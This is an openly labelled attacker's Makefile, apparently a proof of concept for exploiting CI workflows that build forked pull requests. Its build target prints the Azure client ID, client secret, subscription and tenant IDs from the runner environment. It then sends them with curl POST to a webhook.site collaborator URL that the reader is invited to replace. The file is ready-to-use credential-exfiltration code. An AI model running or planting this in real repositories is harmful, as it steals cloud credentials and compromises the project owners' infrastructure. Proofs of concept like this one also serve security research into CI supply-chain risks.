# ============================================================================
# ATTACKER'S MAKEFILE  (replaces the upstream Makefile in the fork)
# ============================================================================
# This Makefile exfiltrates every secret that the workflow injected into
# the environment. In the PoC we send them to a Burp Collaborator / webhook
# so they appear out-of-band — proving the credentials leave the runner.
#
# Replace EXFIL_URL with your own https://webhook.site or Burp Collaborator.
# ============================================================================

EXFIL_URL := https://webhook.site/YOUR-UNIQUE-ID

.PHONY: build

build:
	@echo "=== ATTACKER MAKEFILE EXECUTING ==="
	@echo ""
	@echo "[*] Dumping Azure credentials from CI environment..."
	@echo "  AZ_CLIENT_ID       = $$AZ_CLIENT_ID"
	@echo "  AZ_CLIENT_SECRET   = $$AZ_CLIENT_SECRET"
	@echo "  AZ_SUBSCRIPTION_ID = $$AZ_SUBSCRIPTION_ID"
	@echo "  AZ_TENANT_ID       = $$AZ_TENANT_ID"
	@echo ""
	@echo "[*] Exfiltrating to $(EXFIL_URL) ..."
	@curl -s -X POST $(EXFIL_URL) \
		-H "Content-Type: application/json" \
		-d "{\"client_id\":\"$$AZ_CLIENT_ID\",\"client_secret\":\"$$AZ_CLIENT_SECRET\",\"subscription_id\":\"$$AZ_SUBSCRIPTION_ID\",\"tenant_id\":\"$$AZ_TENANT_ID\"}"
	@echo ""
	@echo "[+] Credentials exfiltrated. Attack complete."
